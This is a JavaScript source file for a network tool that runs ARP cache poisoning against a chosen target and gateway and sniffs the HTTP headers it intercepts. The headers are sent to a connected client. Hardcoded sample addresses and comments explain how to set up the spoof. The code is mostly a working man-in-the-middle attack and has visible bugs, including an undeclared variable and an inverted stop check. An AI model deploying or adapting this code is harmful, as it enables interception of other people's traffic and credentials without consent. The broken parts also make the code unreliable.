const pcap = require('pcap')
const fs = require('fs')
const pcapFilters = require('./pcap-filters')

class PcapSniffer {

  constructor () {
    this.name = 'PcapSniffer'
    this.sniff = false
    this._if = 'en0'
    this.initComplete = false;
    this._client = null
    this.arpInterval = null
    // TODO: Make this dynamic
    // this.mac = "60:03:08:93:6b:ba"
    try{
      this.session = pcap.createSession(this._if, pcapFilters.http)
    }
    catch(err){
      this.session = null
    }
  }

  info (msg){
    console.log(`[${this.name}] : ${msg}`)
  }

  error (msg){
    console.log(`[${this.name} - Err] : ${msg}`)
  }

  set client(socket) {
    this._client = socket
  }

  get client() {
    return this._client
  }

  init (){
    if(this.session && !this.initComplete){
      this.session.on('packet', this._cb.bind(this))
      this.initComplete = true
    }
    if(this.session === null){
      if(this._client){
        this._client.emit('bpfError');
      }
      else{
        this.error('Client socket not found!')
      }
    }
  }

  start (socket) {
    this.sniff = true
  }

  stop (socket) {
    this.sniff = false
  }

  startArpSpoof (params) {
    if(!this.arpInterval)
      this.arpInterval = setInterval(() => {
        this.arpPack(params.toRouter)
        this.arpPack(params.toTarget)
      }, 5000)
    else{
      clearInterval(this.arpInterval)
        this.arpInterval = setInterval(() => {
        this.arpPack(params.toRouter)
        this.arpPack(params.toTarget)
        }, 5000)
    }
  }

  stopArpSpoof (params) {
    if(!this.arpInterval){
      clearInterval(this.arpInterval)
    }
  }
// src ip  (the IP you're targetting )
// src mac (your OWN mac address)
// target ip : gw (the node youre telling)
// target mac: gw (the node youre telling)

  arpPack (config={ src_ip:"192.168.1.35",
                    src_mac:"60:03:08:93:6b:ba",
                    target_ip:"192.168.1.1",
                    target_mac:"6c:72:20:6b:89:44"})
  {
    pkt_config = {
            'op': 'request',
            'src_ip': config.src_ip,
            'src_mac': config.src_mac,
            'dst_ip': config.target_ip,
            'dst_mac': config.target_mac
            }

    let pkt = {};
    pkt.dst = this.mac_to_arr("ff:ff:ff:ff:ff:ff");
    pkt.src = this.mac_to_arr(this.mac);

    // ARP
    pkt.ether_type = [0x08, 0x06];
    pkt.hw_type = [0x00, 0x01];
    pkt.proto_type = [0x08, 0x00];
    pkt.hw_len = [0x06];
    pkt.proto_len = [0x04];
    pkt.op = [0x00, 0x02];

    pkt.src_mac = this.mac_to_arr(this.mac);
    pkt.src_mac = this.mac_to_arr(pkt_config.src_mac);
    pkt.src_ip = this.ip_to_arr(pkt_config.src_ip);
    pkt.dst_mac = this.mac_to_arr(pkt_config.dst_mac);
    pkt.dst_ip = this.ip_to_arr(pkt_config.dst_ip);

    var x;
    var pktArr = [];
    for (x in pkt) {
      pktArr = pktArr.concat(pkt[x]);
    }

    var arpRequest = new Buffer(pktArr);
    this.session.inject(arpRequest);
    // console.log('packet sent');
  }

  _cb (raw) {
      const packet = pcap.decode.packet(raw)
      const parsed = this._parse(packet)
      if(this._client && parsed){
        this._client.emit('newPacket', parsed);
      }
  }

  _parse (packet) {
    const ts = packet.pcap_header.tv_sec
    const eth = packet.payload
    const ip = eth.payload
    const tcp = ip.payload
    // console.log(ip.saddr, ip.daddr)
    // console.log(eth.dhost, eth.shost)
    let raw = tcp.data.toString('utf-8')
    if(raw.indexOf('Content-Length') === -1 &&
        raw.indexOf('Host') === -1 &&
        raw.indexOf('Content-Type') === -1 ){
      return false;
    }
    let httpRaw = raw.split('\r\n')
    let httpHeaders = httpRaw.filter(function (o) {
                                      if( (o.indexOf(':') > -1 ||
                                           o.indexOf('HTTP') > -1 ||
                                           o.indexOf('GET') > -1 ||
                                           o.indexOf('POST') > -1 ) )
                                      {
                                        return true;
                                      }
                                      else{
                                        return false
                                      }
                                    })

    if(httpHeaders.length < 1){
      return false
    }

    return  { ts: ts, eth: eth, ip: ip, tcp: tcp, payload: httpHeaders}
  }

  mac_to_arr(macAddr) {
    var mac_arr = macAddr.split(':');
    var x;
    for (x in mac_arr) {
      mac_arr[x] = '0x' + mac_arr[x];
    }
    return mac_arr;
  }


  ip_to_arr(ipAddr) {
    var ip_arr = ipAddr.split('.');
    var x;
    for (x in ip_arr) {
      ip_arr[x] = ip_arr[x];
    }
    return ip_arr;
  }
}

module.exports = PcapSniffer

    // for (var i = 0; i < httpHeaders.length; i++) {
    //   //;

    //   httpHeaders[i] = httpHeaders[i].replace(/[\x00-\xFF]/, "")//(/[^A-Za-z 0-9 \.,\?""!@#\$%\^&\*\(\)-_=\+;:<>\/\\\|\}\{\[\]`~]*/g, '') ;
    //   // if(httpHeaders[i].search(/(\\u\d{4})/) > -1){
    //   //   console.log()
    //   // }
    // }

    // console.log(httpHeaders)
//
// /[^\000-\031]+/
